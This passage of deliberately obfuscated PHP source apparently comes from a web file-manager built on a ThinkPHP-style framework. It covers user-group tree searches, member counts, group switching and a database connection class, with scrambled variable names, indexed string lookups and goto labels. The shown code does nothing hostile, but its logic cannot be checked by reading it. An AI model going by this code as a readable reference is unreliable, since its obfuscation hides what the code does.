$this->_listDataApply($çØûÁÁí); return $çØûÁÁí; } public function listSearch($¸¯‘º‹ç) { $¡å‡îÌŒ =& $_SERVER[ëæªã÷]; $‰∏Çëê∑ = $¸¯‘º‹ç[$¡å‡îÌŒ[1887]]; $ﬁ‚ÚÅ°– = isset($¸¯‘º‹ç[$¡å‡îÌŒ[1888]]) ? $¸¯‘º‹ç[$¡å‡îÌŒ[1888]] : !1; if (!trim($‰∏Çëê∑)) { return !1; } $‰∏Çëê∑ = str_replace($¡å‡îÌŒ[1889], $¡å‡îÌŒ[1890], $‰∏Çëê∑); $÷ƒöï÷” = array($¡å‡îÌŒ[1796] => array($¡å‡îÌŒ[387], "{$‰∏Çëê∑}\x25"), $¡å‡îÌŒ[32] => array($¡å‡îÌŒ[387], "\45{$‰∏Çëê∑}\45"), $¡å‡îÌŒ[976] => $¡å‡îÌŒ[1891]); if ($ﬁ‚ÚÅ°–) { $Á˛Ì£∞∂ = $this->getInfoSimple($ﬁ‚ÚÅ°–); $ÆÖÎ—ƒı = $Á˛Ì£∞∂[$¡å‡îÌŒ[521]] . $ﬁ‚ÚÅ°– . $¡å‡îÌŒ[545]; $÷ƒöï÷” = array($÷ƒöï÷”, array($¡å‡îÌŒ[521] => array($¡å‡îÌŒ[387], $ÆÖÎ—ƒı))); } $÷ƒöï÷” = $this->parseWhereLike($÷ƒöï÷”); $¥◊÷øÛÏ = $this->_makeOrder()->where($÷ƒöï÷”)->selectPage(20); $¥◊÷øÛÏ = $¥◊÷øÛÏ ? $¥◊÷øÛÏ : array($¡å‡îÌŒ[373] => array(), $¡å‡îÌŒ[370] => array()); if (!$¥◊÷øÛÏ || count($¥◊÷øÛÏ[$¡å‡îÌŒ[373]]) < 5 && Input::check($‰∏Çëê∑, $¡å‡îÌŒ[322])) { $∞ÓÌ¨´Ë = $this->groupChildrenAll($ﬁ‚ÚÅ°–); $›ﬁò£çæ = $this->_searchFromMeta($¡å‡îÌŒ[463], $‰∏Çëê∑, 10, $∞ÓÌ¨´Ë); $±Ü÷œ©ƒ = $this->_searchFromMeta($¡å‡îÌŒ[464], $‰∏Çëê∑, 10, $∞ÓÌ¨´Ë); $À‚‡òè´ = array_merge($›ﬁò£çæ, $±Ü÷œ©ƒ, $¥◊÷øÛÏ[$¡å‡îÌŒ[373]]); $¥◊÷øÛÏ[$¡å‡îÌŒ[373]] = array_unique_by_key($À‚‡òè´, $¡å‡îÌŒ[1796]); $¥◊÷øÛÏ[$¡å‡îÌŒ[370]][$¡å‡îÌŒ[371]] = count($¥◊÷øÛÏ[$¡å‡îÌŒ[373]]); $¥◊÷øÛÏ[$¡å‡îÌŒ[370]][$¡å‡îÌŒ[372]] = ceil($¥◊÷øÛÏ[$¡å‡îÌŒ[370]][$¡å‡îÌŒ[371]] / $¥◊÷øÛÏ[$¡å‡îÌŒ[370]][$¡å‡îÌŒ[367]]); } $this->_listDataApply($¥◊÷øÛÏ[$¡å‡îÌŒ[373]]); return $¥◊÷øÛÏ; } protected function groupChildrenAll($À‰Ê–ø±) { $‘¶¸≠Üä =& $_SERVER[ëæªã÷]; if (!$À‰Ê–ø±) { return !1; } if (is_string($À‰Ê–ø±)) { $À‰Ê–ø± = array($À‰Ê–ø±); } $£‘ƒﬂ⁄€ = $À‰Ê–ø±; foreach ($À‰Ê–ø± as $ﬂ›◊ñ”™) { $—£ÅãÄÊ = $this->getInfoSimple($ﬂ›◊ñ”™); $∞≤∂Õ¬≤ = array($‘¶¸≠Üä[521] => array($‘¶¸≠Üä[387], $—£ÅãÄÊ[$‘¶¸≠Üä[521]] . $ﬂ›◊ñ”™ . $‘¶¸≠Üä[545])); $’‘∞ÍåÃ = $this->field($‘¶¸≠Üä[1796])->where($∞≤∂Õ¬≤)->select(); $£‘ƒﬂ⁄€ = array_merge($£‘ƒﬂ⁄€, array_to_keyvalue($’‘∞ÍåÃ, $‘¶¸≠Üä[12], $‘¶¸≠Üä[1796])); } return array_unique($£‘ƒﬂ⁄€); } private function _searchFromMeta($™ﬁæ˚Œº, $Ø€ﬂ∏©À, $ô˝ºœ⁄, $≈ùõÈñ˝) { $ºˆôÄèã =& $_SERVER[ëæªã÷]; $Ø€ﬂ∏©À = strtolower($Ø€ﬂ∏©À); $√‚È˙√Ò = array($ºˆôÄèã[105] => $™ﬁæ˚Œº, $ºˆôÄèã[378] => array($ºˆôÄèã[387], "\x25{$Ø€ﬂ∏©À}\45")); $√‚È˙√Ò = $this->parseWhereLike($√‚È˙√Ò); if ($≈ùõÈñ˝) { $√‚È˙√Ò[$ºˆôÄèã[1796]] = array($ºˆôÄèã[7], $≈ùõÈñ˝); } $”Ñçﬁπ† = Model($ºˆôÄèã[1892])->where($√‚È˙√Ò)->limit($ô˝ºœ⁄)->select(); if (!$”Ñçﬁπ†) { return array(); } $”Ñçﬁπ† = array_to_keyvalue($”Ñçﬁπ†, $ºˆôÄèã[12], $ºˆôÄèã[1796]); $À∆Ùäô¢ = $this->where(array($ºˆôÄèã[1883] => array($ºˆôÄèã[7], $”Ñçﬁπ†)))->select(); if (!$À∆Ùäô¢) { return array(); } return $À∆Ùäô¢; } protected function _listDataApplyItem($ºÑö¡±») { $˜˚–ôà´ = array($ºÑö¡±»); $this->_listDataApply($˜˚–ôà´); return $˜˚–ôà´[0]; } protected function _listDataApply(&$∂˙ö‚¶ç) { $≥„öú®© =& $_SERVER[ëæªã÷]; if (!$∂˙ö‚¶ç) { return; } $∑êù”ƒ∏ = array_to_keyvalue($∂˙ö‚¶ç, $≥„öú®©[12], $≥„öú®©[1796]); $this->_listAppendChildren($∂˙ö‚¶ç); $this->_listAppendChildrenMember($∂˙ö‚¶ç); $this->_listAppendMeta($∂˙ö‚¶ç, $∑êù”ƒ∏); $this->_listAppendParent($∂˙ö‚¶ç); $this->_listAppendSourceRoot($∂˙ö‚¶ç, $∑êù”ƒ∏); } private function _listAppendChildren(&$ò⁄ ê˙¡) { $ìòá∞úç =& $_SERVER[ëæªã÷]; $ÙÖΩ¬ΩÇ = array_to_keyvalue($ò⁄ ê˙¡, $ìòá∞úç[12], $ìòá∞úç[1796]); $À‡úÉ•√ = array($ìòá∞úç[498] => array($ìòá∞úç[7], $ÙÖΩ¬ΩÇ)); $·‚ÜÌÏ™ = array($ìòá∞úç[498], $ìòá∞úç[1893] => $ìòá∞úç[500]); $Ä∏æ¢Ç§ = $this->field($·‚ÜÌÏ™)->where($À‡úÉ•√)->group($ìòá∞úç[498])->select(); $“Æà≥Ô› = array_to_keyvalue($Ä∏æ¢Ç§, $ìòá∞úç[498], $ìòá∞úç[500]); foreach ($ò⁄ ê˙¡ as &$ÏõÁÅ∫ç) { $∆õá˙â© = $ÏõÁÅ∫ç[$ìòá∞úç[1796]]; $ÏõÁÅ∫ç[$ìòá∞úç[1894]] = isset($“Æà≥Ô›[$∆õá˙â©]) ? intval($“Æà≥Ô›[$∆õá˙â©]) : !1; } unset($ÏõÁÅ∫ç); } private function _listAppendChildrenMember(&$ó«Û≤ıó) { $ÛºŸﬁÃœ =& $_SERVER[ëæªã÷]; $Êπ’ñË› = array_to_keyvalue($ó«Û≤ıó, $ÛºŸﬁÃœ[12], $ÛºŸﬁÃœ[1796]); $Í˝…«ƒ¯ = array($ÛºŸﬁÃœ[1796] => array($ÛºŸﬁÃœ[7], $Êπ’ñË›)); $…ﬁ∆¬ø® = array($ÛºŸﬁÃœ[1796], $ÛºŸﬁÃœ[1893] => $ÛºŸﬁÃœ[500]); $Ä–ñÎã√ = Model($ÛºŸﬁÃœ[1885])->field($…ﬁ∆¬ø®)->where($Í˝…«ƒ¯)->group($ÛºŸﬁÃœ[1796])->select(); $ïüò˝æ≥ = array_to_keyvalue($Ä–ñÎã√, $ÛºŸﬁÃœ[1796], $ÛºŸﬁÃœ[500]); foreach ($ó«Û≤ıó as &$òªÛêΩÔ) { $øˆÿƒÂ¶ = $òªÛêΩÔ[$ÛºŸﬁÃœ[1796]]; $òªÛêΩÔ[$ÛºŸﬁÃœ[1895]] = isset($ïüò˝æ≥[$øˆÿƒÂ¶]) ? intval($ïüò˝æ≥[$øˆÿƒÂ¶]) : !1; } unset($òªÛêΩÔ); } private function _listAppendMeta(&$è«°˜¯Ö, $îËÙ¯Ωí) { $ë‡ç›¶¥ =& $_SERVER[ëæªã÷]; $ç≤Ççß∆ = array($ë‡ç›¶¥[1796] => array($ë‡ç›¶¥[7], $îËÙ¯Ωí)); $ó∆í–Öﬁ = Model($ë‡ç›¶¥[1884])->where($ç≤Ççß∆)->select(); $ó∆í–Öﬁ = array_to_keyvalue_group($ó∆í–Öﬁ, $ë‡ç›¶¥[1796]); foreach ($ó∆í–Öﬁ as &$π˝„Û⁄Ñ) { $π˝„Û⁄Ñ = array_to_keyvalue($π˝„Û⁄Ñ, $ë‡ç›¶¥[105], $ë‡ç›¶¥[378]); } unset($π˝„Û⁄Ñ); foreach ($è«°˜¯Ö as &$ƒÕ¡‘ı∂) { $ƒÕ¡‘ı∂[$ë‡ç›¶¥[465]] = array(); if (isset($ó∆í–Öﬁ[$ƒÕ¡‘ı∂[$ë‡ç›¶¥[1796]]])) { $ƒÕ¡‘ı∂[$ë‡ç›¶¥[465]] = $ó∆í–Öﬁ[$ƒÕ¡‘ı∂[$ë‡ç›¶¥[1796]]]; } } unset($ƒÕ¡‘ı∂); } protected function parentLevelArray($√’ÑŒ£Ó) { $≤∂…·˜í =& $_SERVER[ëæªã÷]; $√’ÑŒ£Ó = explode($≤∂…·˜í[50], trim($√’ÑŒ£Ó, $≤∂…·˜í[50])); $√’ÑŒ£Ó = array_remove_value($√’ÑŒ£Ó, $≤∂…·˜í[200]); return $√’ÑŒ£Ó; } private function _listAppendParent(&$˛ÈÊ≤ôá) { $˝‘ëø±ﬁ =& $_SERVER[ëæªã÷]; $Ä¸®≤™ê = array(); foreach ($˛ÈÊ≤ôá as &$ƒæËç∂‚) { $Ä¸®≤™ê[$ƒæËç∂‚[$˝‘ëø±ﬁ[1796]]] = $ƒæËç∂‚[$˝‘ëø±ﬁ[32]]; $ˆ“ûÚ§Ÿ = $this->parentLevelArray($ƒæËç∂‚[$˝‘ëø±ﬁ[521]]); foreach ($ˆ“ûÚ§Ÿ as $ﬁì÷∞Á) { if (!isset($Ä¸®≤™ê[$ﬁì÷∞Á])) { $Ä¸®≤™ê[$ﬁì÷∞Á] = 0; } } } unset($ƒæËç∂‚); foreach ($Ä¸®≤™ê as $é—©ƒ£Ä => $ÂÁ†ä˜Ê) { if ($ÂÁ†ä˜Ê) { continue; } $ÄÏÂ∏ƒï = $this->getInfoSimple($é—©ƒ£Ä); $Ä¸®≤™ê[$é—©ƒ£Ä] = $ÄÏÂ∏ƒï[$˝‘ëø±ﬁ[32]]; } $âäÙ •ã = $GLOBALS[$˝‘ëø±ﬁ[6]][$˝‘ëø±ﬁ[100]][$˝‘ëø±ﬁ[1896]]; if ($GLOBALS[$˝‘ëø±ﬁ[505]] == $˝‘ëø±ﬁ[99]) { $âäÙ •ã = !1; } foreach ($˛ÈÊ≤ôá as &$ƒæËç∂‚) { $ˆ“ûÚ§Ÿ = $this->parentLevelArray($ƒæËç∂‚[$˝‘ëø±ﬁ[521]]); $π‹∏€ä˘ = $˝‘ëø±ﬁ[12]; foreach ($ˆ“ûÚ§Ÿ as $é—©ƒ£Ä => $ﬁì÷∞Á) { if ($âäÙ •ã && $é—©ƒ£Ä == 0) { continue; } $π‹∏€ä˘ .= $Ä¸®≤™ê[$ﬁì÷∞Á] . $˝‘ëø±ﬁ[8]; } if ($ˆ“ûÚ§Ÿ) { $π‹∏€ä˘ .= $ƒæËç∂‚[$˝‘ëø±ﬁ[32]]; } $ƒæËç∂‚[$˝‘ëø±ﬁ[526]] = str_replace($˝‘ëø±ﬁ[529], $˝‘ëø±ﬁ[8], $π‹∏€ä˘); } unset($ƒæËç∂‚); } private function _listAppendSourceRoot(&$ôÈ—Í≈, $®ÕâË∂≈) { $÷ÖÖèÍπ =& $_SERVER[ëæªã÷]; $Ü‚Åº°À = Model($÷ÖÖèÍπ[805])->listSourceRoot(SourceModel::TYPE_GROUP, $®ÕâË∂≈); $Ü‚Åº°À = array_to_keyvalue($Ü‚Åº°À, $÷ÖÖèÍπ[504]); $Ü‚Åº°À = array_remove_key($Ü‚Åº°À, $÷ÖÖèÍπ[504]); foreach ($ôÈ—Í≈ as &$§Ïï£›º) { $§Ïï£›º[$÷ÖÖèÍπ[97]] = $Ü‚Åº°À[$§Ïï£›º[$÷ÖÖèÍπ[1796]]] ? $Ü‚Åº°À[$§Ïï£›º[$÷ÖÖèÍπ[1796]]] : array(); } unset($§Ïï£›º); } protected function groupMerge($€˙”öÇ–) { $€˙”öÇ– = array_values(array_unique($€˙”öÇ–)); $Ó·Œÿ’† = array(); for ($Öì˙ßâ™ = 0; $Öì˙ßâ™ < count($€˙”öÇ–); $Öì˙ßâ™++) { $Óè¿ÀÕ˛ = !1; for ($Òß™Æ≤å = 0; $Òß™Æ≤å < count($€˙”öÇ–); $Òß™Æ≤å++) { if ($Öì˙ßâ™ == $Òß™Æ≤å) { continue; } if ($this->isParentOf($€˙”öÇ–[$Òß™Æ≤å], $€˙”öÇ–[$Öì˙ßâ™])) { $Óè¿ÀÕ˛ = !0; break; } } if (!$Óè¿ÀÕ˛) { $Ó·Œÿ’†[] = $€˙”öÇ–[$Öì˙ßâ™]; } } return $Ó·Œÿ’†; } protected function isParentOf($ú¬«äêŸ, $ºÌÒ•≠) { $”ºÛˆÛ≈ =& $_SERVER[ëæªã÷]; if (!$ú¬«äêŸ || !$ºÌÒ•≠ || $ú¬«äêŸ == $ºÌÒ•≠) { return !1; } $íËõ‚¡Å = $this->getInfoSimple($ú¬«äêŸ); $’ù∆Ÿü° = $this->getInfoSimple($ºÌÒ•≠); $™≤ﬁ ÛÆ = $íËõ‚¡Å[$”ºÛˆÛ≈[521]] . $ú¬«äêŸ . $”ºÛˆÛ≈[50]; if (substr($’ù∆Ÿü°[$”ºÛˆÛ≈[521]], 0, strlen($™≤ﬁ ÛÆ)) == $™≤ﬁ ÛÆ) { return !0; } return !1; } public function groupShowRoot($Ω¶âÍ¸≤, $˜ —‡îÜ = false) { $¶¨Œ´ÃÌ =& $_SERVER[ëæªã÷]; $’ø˘Üèï = $this->getInfo($Ω¶âÍ¸≤); if (!$’ø˘Üèï) { return array(); } $≈∆é˘ÖŒ = $this->parentLevelArray($’ø˘Üèï[$¶¨Œ´ÃÌ[521]]); $ú®∏ûπÌ = array($Ω¶âÍ¸≤); if (count($≈∆é˘ÖŒ) == 0) { return $ú®∏ûπÌ; } if ($˜ —‡îÜ && count($≈∆é˘ÖŒ) == 1) { return $ú®∏ûπÌ; } if (!$’ø˘Üèï[$¶¨Œ´ÃÌ[465]] || !isset($’ø˘Üèï[$¶¨Œ´ÃÌ[465]][$¶¨Œ´ÃÌ[1881]]) || $’ø˘Üèï[$¶¨Œ´ÃÌ[465]][$¶¨Œ´ÃÌ[1881]] == $¶¨Œ´ÃÌ[1850]) { return $this->groupShowRoot($≈∆é˘ÖŒ[count($≈∆é˘ÖŒ) - 1], $˜ —‡îÜ); } if ($’ø˘Üèï[$¶¨Œ´ÃÌ[465]][$¶¨Œ´ÃÌ[1881]] == $¶¨Œ´ÃÌ[361]) { $ÌΩµ¿¡… = explode($¶¨Œ´ÃÌ[50], $’ø˘Üèï[$¶¨Œ´ÃÌ[465]][$¶¨Œ´ÃÌ[1882]]); if ($ÌΩµ¿¡…) { $ú®∏ûπÌ = array_merge($ú®∏ûπÌ, $ÌΩµ¿¡…); } } return $ú®∏ûπÌ; } protected function resetParentLevel() { $“ﬂπ‚Àµ =& $_SERVER[ëæªã÷]; $Ù´ñ£≤€ = $“ﬂπ‚Àµ[1796]; $Éõîµûı = $this->select(); $Éõîµûı = array_to_keyvalue($Éõîµûı, $Ù´ñ£≤€); foreach ($Éõîµûı as $Íñ’˝”À) { $úˆÀ¯„‚ = $Íñ’˝”À; $ÈŒÓÿàﬁ = array(); while ($úˆÀ¯„‚[$“ﬂπ‚Àµ[498]] != 0) { $ÈŒÓÿàﬁ[] = $úˆÀ¯„‚[$“ﬂπ‚Àµ[498]]; $úˆÀ¯„‚ = $Éõîµûı[$úˆÀ¯„‚[$“ﬂπ‚Àµ[498]]]; } $ÈŒÓÿàﬁ[] = 0; $ÈŒÓÿàﬁ = $“ﬂπ‚Àµ[50] . implode($“ﬂπ‚Àµ[50], array_reverse($ÈŒÓÿàﬁ)) . $“ﬂπ‚Àµ[50]; $this->setNamePinyin($Íñ’˝”À[$Ù´ñ£≤€], $Íñ’˝”À[$“ﬂπ‚Àµ[32]]); $this->where(array($Ù´ñ£≤€ => $Íñ’˝”À[$Ù´ñ£≤€]))->save(array($“ﬂπ‚Àµ[584] => $ÈŒÓÿàﬁ)); } return $Éõîµûı; } public function groupNameAuto($◊’˚Å∆¿, $èÇô–≈Û) { $‚Ñ¿ã·˜ =& $_SERVER[ëæªã÷]; $î¢ã¥øã = $this->where(array($‚Ñ¿ã·˜[402] => $◊’˚Å∆¿))->getField($‚Ñ¿ã·˜[32], !0); if (!$î¢ã¥øã || !in_array($èÇô–≈Û, $î¢ã¥øã)) { return $èÇô–≈Û; } for ($Ò∏ÀåÙÄ = 1; $Ò∏ÀåÙÄ <= count($î¢ã¥øã) + 1; $Ò∏ÀåÙÄ++) { $æ¿âΩπÊ = $èÇô–≈Û . "\50{$Ò∏ÀåÙÄ}\x29"; if (!in_array($æ¿âΩπÊ, $î¢ã¥øã)) { return $æ¿âΩπÊ; } } } public function groupSwitch($√√ìñ“Ñ, $†ﬁóº ö) { $¡‰…Çú∑ =& $_SERVER[ëæªã÷]; $÷∑°˜∑‹ = array($¡‰…Çú∑[1796] => array($¡‰…Çú∑[7], array($√√ìñ“Ñ, $†ﬁóº ö))); $«ÄË©¯√ = $this->where($÷∑°˜∑‹)->select(); $«ÄË©¯√ = array_to_keyvalue($«ÄË©¯√, $¡‰…Çú∑[1796]); if (!isset($«ÄË©¯√[$√√ìñ“Ñ]) || !isset($«ÄË©¯√[$†ﬁóº ö]) || $«ÄË©¯√[$√√ìñ“Ñ][$¡‰…Çú∑[498]] == 0) { return !1; } $÷∑°˜∑‹ = array($¡‰…Çú∑[1796] => $√√ìñ“Ñ); $∆∫Ê¡ô· = Model($¡‰…Çú∑[1885])->where($÷∑°˜∑‹)->select(); if (!$∆∫Ê¡ô·) { $∆∫Ê¡ô· = array(); } foreach ($∆∫Ê¡ô· as $·È»ÙÆ‹) { $«È¨Çò• = $·È»ÙÆ‹[$¡‰…Çú∑[1628]]; $÷∑°˜∑‹ = array($¡‰…Çú∑[1628] => $«È¨Çò•, $¡‰…Çú∑[1796] => $†ﬁóº ö); $Í≥˙˘Æ« = Model($¡‰…Çú∑[1885])->where($÷∑°˜∑‹)->find(); if (!$Í≥˙˘Æ«) { $◊Êõääµ = array($†ﬁóº ö => $·È»ÙÆ‹[$¡‰…Çú∑[1897]]); Model($¡‰…Çú∑[538])->userGroupAdd($«È¨Çò•, $◊Êõääµ); } Model($¡‰…Çú∑[538])->userGroupRemove($«È¨Çò•, $√√ìñ“Ñ); } $÷∑°˜∑‹ = array($¡‰…Çú∑[412] => 2, $¡‰…Çú∑[498] => 0, $¡‰…Çú∑[411] => 1, $¡‰…Çú∑[504] => array($¡‰…Çú∑[7], array($√√ìñ“Ñ, $†ﬁóº ö))); $‰ºÇÊ§Ù = Model($¡‰…Çú∑[805])->where($÷∑°˜∑‹)->field($¡‰…Çú∑[1898])->select(); $‰ºÇÊ§Ù = array_to_keyvalue($‰ºÇÊ§Ù, $¡‰…Çú∑[504], $¡‰…Çú∑[403]); $âá¶ËÅÛ = !empty($‰ºÇÊ§Ù[$√√ìñ“Ñ]) ? $‰ºÇÊ§Ù[$√√ìñ“Ñ] : !1; if ($âá¶ËÅÛ) { if (!$‰ºÇÊ§Ù[$†ﬁóº ö]) { $‰ºÇÊ§Ù[$†ﬁóº ö] = Model($¡‰…Çú∑[805])->groupRootAdd($†ﬁóº ö); } $˜¶Ë≤≈å = $‰ºÇÊ§Ù[$†ﬁóº ö]; $÷∑°˜∑‹ = array($¡‰…Çú∑[498] => $âá¶ËÅÛ); $‰ºÇÊ§Ù = Model($¡‰…Çú∑[805])->where($÷∑°˜∑‹)->field($¡‰…Çú∑[1899])->select(); if (!$‰ºÇÊ§Ù) { $‰ºÇÊ§Ù = array(); } Model($¡‰…Çú∑[805])->moveClearAuth = !1; foreach ($‰ºÇÊ§Ù as $Ë∞©¥◊¬) { $˝ΩâÀ‘≥ = $Ë∞©¥◊¬[$¡‰…Çú∑[411]] == $¡‰…Çú∑[99] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($¡‰…Çú∑[805])->move($Ë∞©¥◊¬[$¡‰…Çú∑[403]], $˜¶Ë≤≈å, $˝ΩâÀ‘≥); } Model($¡‰…Çú∑[805])->moveClearAuth = !0; $÷∑°˜∑‹ = array($¡‰…Çú∑[412] => 2, $¡‰…Çú∑[504] => $√√ìñ“Ñ); $¨Ãí”›Ÿ = array($¡‰…Çú∑[504] => $†ﬁóº ö); Model($¡‰…Çú∑[1900])->where($÷∑°˜∑‹)->save($¨Ãí”›Ÿ); Model($¡‰…Çú∑[1901])->where($÷∑°˜∑‹)->save($¨Ãí”›Ÿ); } $this->_changeChildLevel($«ÄË©¯√[$√√ìñ“Ñ], $«ÄË©¯√[$†ﬁóº ö], !0); $this->where(array($¡‰…Çú∑[498] => $√√ìñ“Ñ))->save(array($¡‰…Çú∑[498] => $†ﬁóº ö)); $this->_clearChildrenCache($«ÄË©¯√[$†ﬁóº ö]); return !0; } } goto eó†´‘∆ñë; a‚¯ÿ¨¬‘ã: class DbSqlite3 extends DbSqlite3Base { public function query($ÔëÔ«øÃ) { $Ëùê£éß =& $_SERVER[ëæªã÷]; if (!CacheLock::fileLock($Ëùê£éß[13])) { return !1; } $Ûﬂîﬂá≤ = parent::query($ÔëÔ«øÃ); CacheLock::fileUnLock($Ëùê£éß[13]); return $Ûﬂîﬂá≤; } public function execute($È’⁄›ÓË) { $í÷ó›ôö =& $_SERVER[ëæªã÷]; if (!CacheLock::fileLock($í÷ó›ôö[13])) { return !1; } $ãÒœ‚øä = parent::execute($È’⁄›ÓË); CacheLock::fileUnLock($í÷ó›ôö[13]); return $ãÒœ‚øä; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\x74\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\x71" => "\x3d", "\156\x65\161" => "\74\76", "\x67\x74" => "\x3e", "\x65\x67\x74" => "\76\x3d", "\x6c\164" => "\74", "\x65\154\x74" => "\74\75", "\x6e\x6f\164\x6c\x69\x6b\145" => "\x4e\x4f\x54\40\x4c\x49\x4b\x45", "\x6c\151\x6b\145" => "\x4c\x49\113\105", "\x69\x6e" => "\x49\116", "\156\x6f\x74\x69\156" => "\x4e\x4f\124\x20\x49\116", "\156\157\164\x20\151\x6e" => "\x4e\x4f\x54\x20\x49\x4e", "\x62\x65\x74\167\145\145\x6e" => "\x42\x45\x54\127\x45\x45\x4e", "\156\157\164\x62\x65\164\x77\145\x65\156" => "\116\117\x54\x20\x42\105\124\127\105\105\x4e", "\156\x6f\x74\x20\142\145\164\167\x65\x65\x6e" => "\116\x4f\x54\x20\102\105\124\x57\x45\x45\116"); protected $selectSql = "\x53\105\x4c\x45\x43\x54\45\104\111\123\124\111\116\x43\x54\45\x20\x25\106\111\105\x4c\x44\x25\x20\x46\x52\x4f\115\x20\45\x54\101\x42\114\105\45\45\112\117\111\x4e\45\45\x57\110\105\122\x45\x25\45\x47\122\x4f\x55\120\45\45\110\101\x56\x49\x4e\107\45\45\117\122\104\105\122\45\x25\114\111\x4d\x49\124\x25\x20\45\125\x4e\x49\117\116\x25\45\103\x4f\x4d\115\105\x4e\124\x25"; protected $bind = array(); public static function getInstance() { $ûºÂπûÀ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[ëæªã÷][936], $ûºÂπûÀ); } public function factory($≈Îµß≈¿ = '') { $¶¿áØﬂè =& $_SERVER[ëæªã÷]; $≈Îµß≈¿ = $this->parseConfig($≈Îµß≈¿); if (empty($≈Îµß≈¿[$¶¿áØﬂè[937]])) { think_exception(think_lang($¶¿áØﬂè[938])); } $this->dbType = ucwords(strtolower($≈Îµß≈¿[$¶¿áØﬂè[937]])); $÷≈∆∆Çæ = $¶¿áØﬂè[939] . $this->dbType; if (class_exists($÷≈∆∆Çæ)) { $…±Ö®Å∫ = new $÷≈∆∆Çæ($≈Îµß≈¿); if ($¶¿áØﬂè[940] != strtolower($≈Îµß≈¿[$¶¿áØﬂè[937]])) { $…±Ö®Å∫->dbType = strtoupper($this->dbType); } else { $…±Ö®Å∫->dbType = $this->_getDsnType($≈Îµß≈¿[$¶¿áØﬂè[892]]); } } else { think_exception(think_lang($¶¿áØﬂè[941]) . $¶¿áØﬂè[942] . $÷≈∆∆Çæ); } return $…±Ö®Å∫; } public function __call($ÒøÄ∆⁄‘, $≤…ûÌîà) { if (method_exists($this, $ÒøÄ∆⁄‘)) { return call_user_func_array(array($this, $ÒøÄ∆⁄‘), $≤…ûÌîà); } } protected function _getDsnType($®∂¿”ÑÇ) { $ﬂê◊·å = explode($_SERVER[ëæªã÷][4], $®∂¿”ÑÇ); $Éœœ»í‹ = strtoupper(trim($ﬂê◊·å[0])); return $Éœœ»í‹; } private function parseConfig($ˆâÀ”Ü€ = '') { $É»ﬂ∏ÃÆ =& $_SERVER[ëæªã÷]; if (!empty($ˆâÀ”Ü€) && is_string($ˆâÀ”Ü€)) { $ˆâÀ”Ü€ = $this->parseDSN($ˆâÀ”Ü€); } elseif (is_array($ˆâÀ”Ü€)) { $ˆâÀ”Ü€ = array_change_key_case($ˆâÀ”Ü€); $ˆâÀ”Ü€ = array($É»ﬂ∏ÃÆ[937] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[943]], $É»ﬂ∏ÃÆ[864] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[944]], $É»ﬂ∏ÃÆ[865] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[945]], $É»ﬂ∏ÃÆ[862] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[946]], $É»ﬂ∏ÃÆ[863] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[947]], $É»ﬂ∏ÃÆ[21] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[948]], $É»ﬂ∏ÃÆ[892] => $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[949]], $É»ﬂ∏ÃÆ[17] => isset($ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[950]]) ? $ˆâÀ”Ü€[$É»ﬂ∏ÃÆ[950]] : array()); } elseif (empty($ˆâÀ”Ü€)) { if (think_config($É»ﬂ∏ÃÆ[951]) && $É»ﬂ∏ÃÆ[940] != strtolower(think_config($É»ﬂ∏ÃÆ[952]))) { $ˆâÀ”Ü€ = $this->parseDSN(think_config($É»ﬂ∏ÃÆ[951])); } else { $ˆâÀ”Ü€ = array($É»ﬂ∏ÃÆ[937] => think_config($É»ﬂ∏ÃÆ[952]), $É»ﬂ∏ÃÆ[864] => think_config($É»ﬂ∏ÃÆ[953]), $É»ﬂ∏ÃÆ[865] => think_config($É»ﬂ∏ÃÆ[954]), $É»ﬂ∏ÃÆ[862] => think_config($É»ﬂ∏ÃÆ[955]), $É»ﬂ∏ÃÆ[863] => think_config($É»ﬂ∏ÃÆ[956]), $É»ﬂ∏ÃÆ[21] => think_config($É»ﬂ∏ÃÆ[250]), $É»ﬂ∏ÃÆ[892] => think_config($É»ﬂ∏ÃÆ[951]), $É»ﬂ∏ÃÆ[17] => think_config($É»ﬂ∏ÃÆ[957])); } } return $ˆâÀ”Ü€; } protected function initConnect($†¥÷Ïá© = true) { if (1 == think_config($_SERVER[ëæªã÷][22])) { $this->_linkID = $this->multiConnect($†¥÷Ïá©); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $¿ÅçÛè‚ => $Øô‡—ïâ) { $this->_linkID = $Øô‡—ïâ; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($‹ŸÁ◊™° = false) { $Ö¶‘•Ñõ =& $_SERVER[ëæªã÷]; static $¬›±ÀÑÏ = array(); static $òè°ßΩ≤ = -1; if (empty($¬›±ÀÑÏ)) { foreach ($this->config as $ƒ¸ÁÓûß => $ÇÔ€¡’å) { $¬›±ÀÑÏ[$ƒ¸ÁÓûß] = explode($Ö¶‘•Ñõ[50], $ÇÔ€¡’å); } } if (think_config($Ö¶‘•Ñõ[958])) { if ($‹ŸÁ◊™° || think_config($Ö¶‘•Ñõ[397]) === !0) { $òùü≤€ = floor(mt_rand(0, think_config($Ö¶‘•Ñõ[959]) - 1)); $òè°ßΩ≤ = $òùü≤€; } else { if (is_numeric(think_config($Ö¶‘•Ñõ[960]))) { $òùü≤€ = think_config($Ö¶‘•Ñõ[960]); } else { $òùü≤€ = floor(mt_rand(think_config($Ö¶‘•Ñõ[959]), count($¬›±ÀÑÏ[$Ö¶‘•Ñõ[862]]) - 1)); } } } else { $òùü≤€ = floor(mt_rand(0, count($¬›±ÀÑÏ[$Ö¶‘•Ñõ[862]]) - 1)); 